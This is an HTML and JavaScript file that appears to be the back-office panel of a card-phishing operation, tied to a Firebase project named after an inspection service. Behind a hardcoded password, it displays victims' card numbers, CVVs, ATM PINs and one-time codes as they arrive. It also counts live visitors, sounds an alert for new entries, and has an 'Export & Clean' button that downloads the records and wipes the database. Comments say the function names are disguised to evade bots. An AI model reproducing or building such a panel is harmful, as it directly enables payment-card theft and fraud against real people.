<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard System</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
    
    <style>
        /* التنسيق اللي بتحبه مع لمسة حماية */
        body { font-family: sans-serif; background: #ececec; margin: 0; padding: 0; }
        #auth_gate { position: fixed; inset: 0; background: #1e7344; display: flex; align-items: center; justify-content: center; z-index: 10000; }
        .gate-box { background: #fff; padding: 30px; border-radius: 12px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
        .main-ui { display: none; padding: 20px; }
        .navbar { background: #1e7344; color: #fff; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-radius: 0 0 15px 15px; }
        .v-count { background: #ffd700; color: #000; padding: 5px 15px; border-radius: 20px; font-weight: bold; font-size: 14px; }
        .cards-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; margin-top: 20px; }
        .card { background: #fff; border-radius: 12px; padding: 15px; border: 1px solid #ddd; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
        .card-row { display: flex; justify-content: space-between; margin-bottom: 8px; border-bottom: 1px solid #f0f0f0; padding-bottom: 4px; }
        .label { color: #777; font-size: 12px; }
        .value { font-weight: bold; font-family: monospace; font-size: 15px; }
        .btn-pdf { background: #d32f2f; color: #fff; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
        .is-live { border: 2px solid #28a745; animation: blink 1.2s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
    </style>
</head>
<body onload="_initAuth()">

<audio id="notif_sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

<div id="auth_gate">
    <div class="gate-box">
        <h3 style="margin-top:0; color:#1e7344">System Verification</h3>
        <input type="password" id="access_key" placeholder="Key" style="width:200px; padding:10px; border:1px solid #ddd; border-radius:5px; text-align:center;">
        <br><br>
        <button onclick="_verify()" style="width:100%; padding:10px; background:#1e7344; color:#fff; border:none; border-radius:5px; cursor:pointer;">Verify Access</button>
    </div>
</div>

<div id="main_ui_wrap" class="main-ui">
    <div class="navbar">
        <div class="v-count">Live: <span id="v_total">0</span></div>
        <button class="btn-pdf" onclick="_exportPDF()">Export & Clean</button>
        <button onclick="_exit()" style="background:#444; color:#fff; border:none; padding:8px 15px; border-radius:5px; cursor:pointer;">Exit</button>
    </div>
    <div class="cards-grid" id="data_stream"></div>
</div>

<script>
    /** * تم استخدام أسماء دوال مبهمة للتمويه أمام الروبوتات
     * كلمة المرور: HH1234567890
     */
    const _K = "HH1234567890"; 
    const _S = "auth_session_id_99";
    let _DB;

    function _initAuth() {
        if(sessionStorage.getItem(_S) === "valid") _launch();
    }

    function _verify() {
        const val = document.getElementById('access_key').value;
        if(val === _K) {
            sessionStorage.setItem(_S, "valid");
            _launch();
        } else {
            alert("Unauthorized Access");
        }
    }

    function _launch() {
        document.getElementById('auth_gate').style.display = 'none';
        document.getElementById('main_ui_wrap').style.display = 'block';
        _connectDB();
    }

    function _exit() {
        sessionStorage.removeItem(_S);
        location.reload();
    }

    function _connectDB() {
        const _cfg = {
            apiKey: "AIzaSyAeZAjt4kZWVLJSKiehqLFrT8X6X8X6X8",
            authDomain: "saso-inspection.firebaseapp.com",
            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
            projectId: "saso-inspection"
        };
        if (!firebase.apps.length) firebase.initializeApp(_cfg);
        _DB = firebase.database();

        // مراقبة الزوار
        _DB.ref('live_visitors').on('value', snap => {
            let c = 0; const now = Date.now();
            snap.forEach(i => { if(now - i.val().last_active < 30000) c++; });
            document.getElementById('v_total').innerText = c;
        });

        // استلام البيانات
        _DB.ref('payments').on('child_added', snap => { _render(snap.key, snap.val()); });
        _DB.ref('payments').on('child_removed', snap => {
            const el = document.getElementById('r_' + snap.key);
            if(el) el.remove();
        });
    }

    function _render(id, data) {
        const container = document.getElementById('data_stream');
        const isNew = (data.status && data.status.includes('waiting'));
        const html = `
            <div class="card ${isNew ? 'is-live' : ''}" id="r_${id}">
                <div class="card-row"><span class="label">Name</span><span class="value">${data.cardHolder || 'User'}</span></div>
                <div class="card-row"><span class="label">Card</span><span class="value">${data.cardNumber}</span></div>
                <div class="card-row"><span class="label">Exp/CVV</span><span class="value">${data.expiry} | ${data.cvv}</span></div>
                <div class="card-row"><span class="label">ATM PIN</span><span class="value" style="color:purple">${data.atm_pin || '-'}</span></div>
                <div class="card-row"><span class="label">OTP Code</span><span class="value" style="color:blue; font-size:18px">${data.otp || '-'}</span></div>
            </div>
        `;
        container.insertAdjacentHTML('afterbegin', html);
        if(isNew) { document.getElementById('notif_sound').play().catch(e=>{}); }
    }

    async function _exportPDF() {
        const target = document.getElementById('data_stream');
        if(!target.children.length) return alert("No Data");

        if(confirm("Download PDF and Clear Database?")) {
            const opt = { margin: 10, filename: 'log_report.pdf', image: { type: 'jpeg' }, html2canvas: { scale: 2 }, jsPDF: { unit: 'mm', format: 'a4' } };
            html2pdf().set(opt).from(target).save().then(() => {
                _DB.ref('payments').remove().then(() => { alert("Cleared."); });
            });
        }
    }
</script>
</body>
</html>
